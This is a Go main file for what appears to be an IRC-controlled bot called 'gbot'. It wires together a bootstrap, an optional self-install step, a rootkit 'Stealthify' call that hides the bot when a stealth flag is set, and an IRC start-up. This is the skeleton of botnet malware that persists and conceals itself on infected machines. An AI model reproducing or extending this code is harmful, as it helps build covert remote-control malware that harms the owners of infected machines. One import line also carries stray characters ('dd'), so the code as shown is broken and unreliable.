package main

import (
	gbootstrap "gbot/bootstrap"
	gconfig "gbot/config"
	girc "gbot/irc"dd
	grootkit "gbot/rootkit"
)

var ()

func main() {

	gbootstrap.RunOnce(gconfig.InstanceKey)

	if gconfig.Install {
		gbootstrap.Install()
	}

	if gconfig.Stealth {
		grootkit.Stealthify()
	}

	girc.Start()
}
